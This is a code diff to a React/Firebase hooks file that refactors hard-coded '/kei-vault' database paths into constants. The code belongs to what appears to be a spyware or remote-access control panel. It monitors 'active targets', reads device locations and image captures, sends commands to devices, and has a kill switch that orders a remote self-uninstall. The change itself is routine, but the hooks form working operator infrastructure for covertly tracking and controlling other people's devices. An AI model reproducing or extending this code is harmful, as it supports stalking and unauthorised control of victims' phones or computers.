@@ -8,7 +8,7 @@
 import { useMutation, useQueryClient } from '@tanstack/react-query';
 import { ref, onValue, set, push, DatabaseReference } from 'firebase/database';
 import { ref as storageRef, listAll, getBytes } from 'firebase/storage';
-import { database, storage } from '@/lib/firebase';
+import { database, storage, FIREBASE_PATHS } from '@/lib/firebase';
 import { Device, Location, Command, SystemLog, DashboardStats, ImageCapture } from '@/types';
 import { useEffect, useState } from 'react';
 
@@ -21,7 +21,7 @@ export function useActiveDevices() {
   const [error, setError] = useState<Error | null>(null);
 
   useEffect(() => {
-    const devicesRef = ref(database, '/kei-vault/active_targets');
+    const devicesRef = ref(database, FIREBASE_PATHS.ACTIVE_TARGETS);
 
     const unsubscribe = onValue(
       devicesRef,
@@ -58,7 +58,7 @@ export function useDeviceLocations() {
   const [isLoading, setIsLoading] = useState(true);
 
   useEffect(() => {
-    const locationsRef = ref(database, '/kei-vault/device_locations');
+    const locationsRef = ref(database, FIREBASE_PATHS.DEVICE_LOCATIONS);
 
     const unsubscribe = onValue(
       locationsRef,
@@ -100,7 +100,7 @@ export function useDashboardStats() {
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
-    const statsRef = ref(database, '/kei-vault/stats');
+    const statsRef = ref(database, FIREBASE_PATHS.STATS);
 
     const unsubscribe = onValue(
       statsRef,
@@ -130,7 +130,7 @@ export function useActivityLogs() {
   const [isLoading, setIsLoading] = useState(true);
 
   useEffect(() => {
-    const logsRef = ref(database, '/kei-vault/activity_logs');
+    const logsRef = ref(database, FIREBASE_PATHS.ACTIVITY_LOGS);
 
     const unsubscribe = onValue(
       logsRef,
@@ -168,7 +168,7 @@ export function useSystemLogs(limit: number = 500) {
   const [isLoading, setIsLoading] = useState(true);
 
   useEffect(() => {
-    const logsRef = ref(database, '/kei-vault/system_logs');
+    const logsRef = ref(database, FIREBASE_PATHS.SYSTEM_LOGS);
 
     const unsubscribe = onValue(
       logsRef,
@@ -207,7 +207,7 @@ export function useSendCommand() {
 
   return useMutation({
     mutationFn: async (data: { deviceId: string; action: Command['action'] }) => {
-      const commandsRef = ref(database, `/kei-vault/commands/${data.deviceId}`);
+      const commandsRef = ref(database, `${FIREBASE_PATHS.COMMANDS}/${data.deviceId}`);
       const newCommandRef = push(commandsRef);
 
       await set(newCommandRef, {
@@ -233,7 +233,7 @@ export function useKillSwitch() {
   return useMutation({
     mutationFn: async (deviceIds: string[]) => {
       const killSwitchCommands = deviceIds.map(async (deviceId) => {
-        const commandsRef = ref(database, `/kei-vault/commands/${deviceId}`);
+        const commandsRef = ref(database, `${FIREBASE_PATHS.COMMANDS}/${deviceId}`);
         const newCommandRef = push(commandsRef);
 
         await set(newCommandRef, {
@@ -245,7 +245,7 @@ export function useKillSwitch() {
         });
 
         // Log kill switch activation
-        const logsRef = ref(database, '/kei-vault/system_logs');
+        const logsRef = ref(database, FIREBASE_PATHS.SYSTEM_LOGS);
         const newLogRef = push(logsRef);
         await set(newLogRef, {
           message: `KILL SWITCH ACTIVATED: Self-uninstall command sent to device ${deviceId}`,
@@ -326,7 +326,7 @@ export function useDeviceLocation(deviceId: string) {
   const [history, setHistory] = useState<Location[]>([]);
 
   useEffect(() => {
-    const locationRef = ref(database, `/kei-vault/device_locations/${deviceId}`);
+    const locationRef = ref(database, `${FIREBASE_PATHS.DEVICE_LOCATIONS}/${deviceId}`);
 
     const unsubscribe = onValue(
       locationRef,
